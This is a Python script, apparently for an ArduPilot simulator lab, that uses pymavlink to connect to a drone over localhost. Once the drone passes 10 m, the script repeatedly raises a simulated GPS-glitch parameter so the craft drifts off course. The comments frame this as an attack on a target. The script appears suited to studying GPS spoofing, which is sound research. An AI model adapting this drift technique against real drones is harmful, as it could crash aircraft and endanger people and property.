import time
from pymavlink import mavutil

# The command used to start the ardupilot software opened two ports: 1 to connect to the apm planner and the other to connect into this script 

# We use mavutil.mavlink_connection to connect the script to the Drone on port 14551
print("--- Searching for target drone on port 14551 ---")
master = mavutil.mavlink_connection('udpin:127.0.0.1:14551')
master.wait_heartbeat()
print(f"--- TARGET DETECTED: System {master.target_system} ---")

# This variable is used to accumulate the GPS offset, to later increase
glitch_offset = 0.0

# This constant defines the "drift speed", how fast the drone will fly away
DRIFT_SPEED = 0.00001 

# Main cycle of the script
while True:
    # We start by reading the drone's position to see if it is already at 10m of altitude
    msg = master.recv_match(type='GLOBAL_POSITION_INT', blocking=True)
    
    if msg:
        # Since the units that the message received are not in meters, we need to do some calculations
        altitude = msg.relative_alt / 1000.0
        # Print status on the same line to keep terminal clean and to make more visible of what the script is doing
        print(f"Altitude: {altitude:.1f}m | Current GPS Offset: {glitch_offset:.6f}", end="\r")

        # We will only attack if the drone is above 10 meters
        if altitude > 10:
            
            # We keep continuosly to increase the GPS offset
            glitch_offset += DRIFT_SPEED
            
            # Sending the new fake GPS coordinates - Latitude Glitch
            master.mav.param_set_send(
                master.target_system,
                master.target_component,
                b'SIM_GPS_GLITCH_Y',  # Parameter to fake Latitude
                glitch_offset,        # The fake value
                mavutil.mavlink.MAV_PARAM_TYPE_REAL32
            )

    # we run this loop 10 times per second to make it look real
    time.sleep(0.1)